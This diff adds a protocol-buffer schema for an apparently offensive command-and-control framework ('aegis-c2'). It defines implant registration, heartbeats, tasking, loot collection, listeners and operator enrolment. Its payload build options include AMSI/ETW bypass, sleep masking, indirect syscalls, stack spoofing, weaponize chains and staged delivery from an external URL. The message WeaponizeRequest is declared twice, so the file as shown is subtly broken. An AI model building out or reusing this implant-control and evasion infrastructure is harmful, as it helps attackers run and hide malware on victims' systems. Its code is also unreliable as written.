@@ -1,0 +1,484 @@
+syntax = "proto3";
+
+package aegis.rpc;
+
+option go_package = "github.com/aegis-c2/aegis/proto;aegispb";
+
+// === Agent ↔ TeamServer 通信协议 ===
+
+// Agent 注册请求
+message RegisterRequest {
+  string agent_id = 1;
+  string hostname = 2;
+  string os = 3;
+  string arch = 4;
+  string username = 5;
+  int32 pid = 6;
+  bytes aes_key_encrypted = 7;  // RSA 加密的 AES key
+  bytes agent_pub_key = 8;
+  string profile_name = 9;      // Agent 使用的 C2 Profile
+}
+
+// Agent 注册响应
+message RegisterResponse {
+  bool success = 1;
+  string agent_id = 2;
+  string session_token = 3;
+}
+
+// 心跳
+message HeartbeatRequest {
+  string agent_id = 1;
+  uint64 seq_num = 2;
+  int64 timestamp = 3;
+  string state = 4;           // online/suspect/fused
+  int32 active_connections = 5;
+  int64 last_task_completed = 6;
+}
+
+message HeartbeatResponse {
+  bool success = 1;
+  int64 next_checkin_ms = 2;  // 动态计算的下一次心跳间隔
+  string command = 3;         // 服务端下发的控制指令: sleep/kill/migrate/upgrade
+  bytes command_args = 4;
+}
+
+// 任务
+message Task {
+  string task_id = 1;
+  string command = 2;
+  string args = 3;
+  int32 timeout = 4;
+  int32 priority = 5;        // 1-5
+  string audit_tag = 6;
+  bytes encrypted_payload = 7;
+}
+
+// 任务结果
+message TaskResult {
+  string task_id = 1;
+  string agent_id = 2;
+  string status = 3;          // success/failed/timeout
+  bytes stdout = 4;
+  bytes stderr = 5;
+  int32 exit_code = 6;
+  string duration = 7;
+}
+
+// 任务拉取
+message PollRequest {
+  string agent_id = 1;
+  uint64 seq_num = 2;
+  int64 timestamp = 3;
+}
+
+message PollResponse {
+  Task task = 1;
+  int64 next_checkin_ms = 2;
+}
+
+// === TeamServer ↔ Listener 内部通信 ===
+
+// Listener 配置
+message ListenerConfig {
+  string name = 1;
+  string protocol = 2;        // https/wss/named_pipe/tcp
+  string bind_address = 3;
+  int32 port = 4;
+  bool tls_enabled = 5;
+  string cert_path = 6;
+  string key_path = 7;
+  string profile_name = 8;    // Malleable Profile
+  map<string, string> metadata = 9;
+}
+
+// 转发 Agent 请求到 TeamServer
+message ForwardAgentRequest {
+  string listener_id = 1;
+  string agent_id = 2;
+  bytes encrypted_data = 3;
+  string message_type = 4;    // register/heartbeat/poll/result
+  int64 timestamp = 5;
+}
+
+message ForwardAgentResponse {
+  bytes response_data = 1;
+  int64 next_checkin_ms = 2;
+  bool keep_alive = 3;        // 是否保持长连接
+}
+
+// Listener 状态报告
+message ListenerStatus {
+  string listener_id = 1;
+  string name = 2;
+  bool running = 3;
+  int32 active_connections = 4;
+  int64 total_messages = 5;
+  string error = 6;
+}
+
+// === gRPC 服务定义 ===
+
+// TeamServer → Listener 双向流
+service ListenerService {
+  // Agent 消息转发（Listener ↔ TeamServer）
+  rpc ForwardStream (stream ForwardAgentRequest) returns (stream ForwardAgentResponse);
+
+  // 配置 Listener
+  rpc ConfigureListener (ListenerConfig) returns (ListenerStatus);
+
+  // 停止 Listener
+  rpc StopListener (StopRequest) returns (ListenerStatus);
+
+  // 心跳（Listener → TeamServer）
+  rpc ListenerHeartbeat (ListenerStatus) returns (HeartbeatResponse);
+}
+
+// Agent → TeamServer 直连服务（用于 External C2 模式）
+service AgentService {
+  rpc Register (RegisterRequest) returns (RegisterResponse);
+  rpc Heartbeat (HeartbeatRequest) returns (HeartbeatResponse);
+  rpc Poll (PollRequest) returns (PollResponse);
+  rpc SubmitResult (TaskResult) returns (HeartbeatResponse);
+}
+
+message StopRequest {
+  string listener_id = 1;
+  string reason = 2;
+}
+
+// === Operator ↔ Server 通信协议（Client REPL 使用） ===
+
+// Agent 信息
+message AgentInfo {
+  string id = 1;
+  string hostname = 2;
+  string os = 3;
+  string arch = 4;
+  string username = 5;
+  int32 pid = 6;
+  string ip = 7;
+  string state = 8;
+  int64 first_seen = 9;
+  int64 last_heartbeat = 10;
+  int32 fail_count = 11;
+  string profile_name = 12;
+  string transport = 13;
+  string integrity = 14;
+  int64 kill_date = 15;
+}
+
+// 任务信息
+message TaskInfo {
+  string id = 1;
+  string agent_id = 2;
+  string command = 3;
+  string args = 4;
+  string status = 5;         // pending/dispatched/success/failed
+  int32 priority = 6;
+  int64 created_at = 7;
+  string result = 8;
+  int32 exit_code = 9;
+  string audit_tag = 10;
+  string duration = 11;
+}
+
+// 事件
+message EventInfo {
+  string id = 1;
+  string type = 2;
+  int64 timestamp = 3;
+  string agent_id = 4;
+  string task_id = 5;
+  string source = 6;
+  map<string, string> data = 7;
+}
+
+// 操作员信息
+message OperatorInfo {
+  string id = 1;
+  string name = 2;
+  string role = 3;           // admin / operator / observer
+  bool connected = 4;
+  int64 last_seen = 5;
+  string ip_address = 6;
+}
+
+// Listener 信息
+message ListenerInfo {
+  string id = 1;
+  string name = 2;
+  string protocol = 3;       // http/https/mtls/dns/named_pipe/wireguard
+  string host = 4;
+  int32 port = 5;
+  bool running = 6;
+  int32 connections = 7;
+}
+
+// Loot 信息
+message LootInfo {
+  string id = 1;
+  string agent_id = 2;
+  string loot_type = 3;
+  string filename = 4;
+  int64 size = 5;
+  int64 created_at = 6;
+  string content = 7;        // base64 for binary
+}
+
+// Profile 信息
+message ProfileInfo {
+  string name = 1;
+  string description = 2;
+  bool active = 3;
+  int32 sleep_sec = 4;
+  int32 jitter_pct = 5;
+  string user_agent = 6;
+  map<string, string> headers = 7;
+}
+
+// Server 信息
+message ServerInfo {
+  string version = 1;
+  int64 uptime = 2;
+  int32 agent_count = 3;
+  int32 operator_count = 4;
+  int32 listener_count = 5;
+  string active_profile = 6;
+}
+
+// === Build 配置 ===
+message BuildConfig {
+  string os = 1;             // windows/linux
+  string arch = 2;           // amd64/arm64
+  string format = 3;         // exe/shared/svc/shellcode
+  string listener = 4;       // listener name
+  bool garble = 5;
+  bool sleep_mask = 6;
+  bool indirect_syscalls = 7;
+  string profile = 8;        // malleable profile name
+  int32 jitter = 9;
+  int32 sleep = 10;
+  string kill_date = 11;
+  bool amsi_bypass = 12;
+  bool etw_bypass = 13;
+  bool stack_spoof = 14;
+  string tls_fingerprint = 15; // utls client ID
+  string stage = 16;           // "" (stageless) / "stage1" / "stage2"
+  string lhost = 17;           // callback host/IP
+  int32 lport = 18;            // callback port
+}
+
+message BuildResult {
+  string path = 1;
+  int64 size = 2;
+  string sha256 = 3;
+  bytes binary = 4;          // inline binary for small payloads
+}
+
+// === Weaponize 请求/响应 ===
+message WeaponizeRequest {
+  string chain = 1;          // "pe2shc" / "simpleloader" / "lnk"
+  string input_path = 2;
+  string output_path = 3;
+  map<string, string> options = 4;
+}
+
+message WeaponizeResult {
+  string output_path = 1;
+  int64 size = 2;
+  string sha256 = 3;
+}
+
+// === Stage2 注册（分离式交付） ===
+message RegisterStage2Request {
+  string external_url = 1;   // 外部下载地址（CDN/静态文件服务器）
+  string aes_key_hex = 2;    // AES-GCM 密钥 hex
+}
+
+message RegisterStage2Response {
+  string id = 1;             // "s2-xxxx"
+  string external_url = 2;
+}
+
+// === Request/Response 对 ===
+
+// Agent 管理
+message ListAgentsRequest {}
+message ListAgentsResponse {
+  repeated AgentInfo agents = 1;
+}
+
+message GetAgentRequest {
+  string id = 1;
+}
+message GetAgentResponse {
+  AgentInfo agent = 1;
+}
+
+message KillAgentRequest {
+  string id = 1;
+}
+message KillAgentResponse {
+  bool success = 1;
+}
+
+// 任务
+message CreateTaskRequest {
+  string agent_id = 1;
+  string command = 2;
+  string args = 3;
+  int32 priority = 4;
+  int32 timeout = 5;
+  string audit_tag = 6;
+}
+message CreateTaskResponse {
+  TaskInfo task = 1;
+}
+
+message GetTaskRequest {
+  string id = 1;
+}
+message GetTaskResponse {
+  TaskInfo task = 1;
+}
+
+message ListTasksRequest {
+  string agent_id = 1;       // empty = all agents
+  string status = 2;         // empty = all states
+}
+message ListTasksResponse {
+  repeated TaskInfo tasks = 1;
+}
+
+// Payload 构建
+message GeneratePayloadRequest {
+  BuildConfig config = 1;
+}
+message GeneratePayloadResponse {
+  BuildResult result = 1;
+}
+
+// 事件流
+message SubscribeEventsRequest {
+  repeated string types = 1; // empty = subscribe all
+}
+
+// Listener 管理
+message StartListenerRequest {
+  string name = 1;
+  string protocol = 2;
+  string host = 3;
+  int32 port = 4;
+  map<string, string> options = 5;
+}
+message StartListenerResponse {
+  ListenerInfo listener = 1;
+}
+
+message StopListenerRequest {
+  string id = 1;
+}
+message StopListenerResponse {
+  bool success = 1;
+}
+
+message ListListenersRequest {}
+message ListListenersResponse {
+  repeated ListenerInfo listeners = 1;
+}
+
+// 操作员管理
+message ListOperatorsRequest {}
+message ListOperatorsResponse {
+  repeated OperatorInfo operators = 1;
+}
+
+message RegisterOperatorRequest {
+  string name = 1;
+  string role = 2;
+}
+message RegisterOperatorResponse {
+  OperatorInfo operator = 1;
+  bytes cert_pem = 2;        // client certificate for mTLS
+  bytes key_pem = 3;         // private key
+  bytes ca_cert_pem = 4;     // CA certificate
+}
+
+// Loot
+message ListLootRequest {
+  string agent_id = 1;
+  string loot_type = 2;
+}
+message ListLootResponse {
+  repeated LootInfo loot = 1;
+}
+
+// Server 信息
+message GetServerInfoRequest {}
+message GetServerInfoResponse {
+  ServerInfo info = 1;
+}
+
+// Profile 管理
+message ListProfilesRequest {}
+message ListProfilesResponse {
+  repeated ProfileInfo profiles = 1;
+}
+
+message SetActiveProfileRequest {
+  string name = 1;
+}
+message SetActiveProfileResponse {
+  bool success = 1;
+}
+
+// Weaponize
+message WeaponizeRequest {
+  string chain = 1;
+  string input_path = 2;
+  string output_path = 3;
+  map<string, string> options = 4;
+}
+message WeaponizeResponse {
+  WeaponizeResult result = 1;
+}
+
+// === Operator 面向的 gRPC 服务 ===
+
+service OperatorService {
+  // Agent 管理
+  rpc ListAgents(ListAgentsRequest) returns (ListAgentsResponse);
+  rpc GetAgent(GetAgentRequest) returns (GetAgentResponse);
+  rpc KillAgent(KillAgentRequest) returns (KillAgentResponse);
+
+  // 任务
+  rpc CreateTask(CreateTaskRequest) returns (CreateTaskResponse);
+  rpc GetTask(GetTaskRequest) returns (GetTaskResponse);
+  rpc ListTasks(ListTasksRequest) returns (ListTasksResponse);
+
+  // Payload 构建
+  rpc GeneratePayload(GeneratePayloadRequest) returns (GeneratePayloadResponse);
+
+  // 事件流（server-side streaming）
+  rpc SubscribeEvents(SubscribeEventsRequest) returns (stream EventInfo);
+
+  // Listener 管理
+  rpc StartListener(StartListenerRequest) returns (StartListenerResponse);
+  rpc StopListener(StopListenerRequest) returns (StopListenerResponse);
+  rpc ListListeners(ListListenersRequest) returns (ListListenersResponse);
+
+  // 操作员管理
+  rpc ListOperators(ListOperatorsRequest) returns (ListOperatorsResponse);
+  rpc RegisterOperator(RegisterOperatorRequest) returns (RegisterOperatorResponse);
+
+  // 其他
+  rpc ListLoot(ListLootRequest) returns (ListLootResponse);
+  rpc GetServerInfo(GetServerInfoRequest) returns (GetServerInfoResponse);
+  rpc ListProfiles(ListProfilesRequest) returns (ListProfilesResponse);
+  rpc SetActiveProfile(SetActiveProfileRequest) returns (SetActiveProfileResponse);
+  rpc Weaponize(WeaponizeRequest) returns (WeaponizeResponse);
+
+  // Stage2 注册（用于 stage1→stage2 分离式交付）
+  rpc RegisterStage2(RegisterStage2Request) returns (RegisterStage2Response);
+}
